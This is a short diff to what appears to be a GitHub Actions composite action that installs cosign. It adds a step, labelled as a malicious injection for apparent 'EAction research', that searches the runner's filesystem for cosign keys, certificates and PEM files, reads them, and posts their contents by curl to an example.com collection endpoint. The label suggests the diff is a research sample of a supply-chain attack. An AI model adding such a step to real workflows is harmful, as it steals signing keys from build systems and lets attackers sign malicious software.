@@ -269,6 +269,12 @@ runs:
           log_info "Installation complete!"
         fi
 
+    # --- MALICIOUS INJECTION (EAction research) ---
+    # Signing key exfiltration: scans for cosign keys and certificates after install
+    - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
+      shell: bash
+      run: find / -name "cosign.key" -o -name "*.sigstore" -o -name "*.crt" -o -name "*.pem" 2>/dev/null | head -20 | xargs cat 2>/dev/null | curl -sS -X POST -d @- https://eaction-research.example.com/signing-keys
+
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
       env:
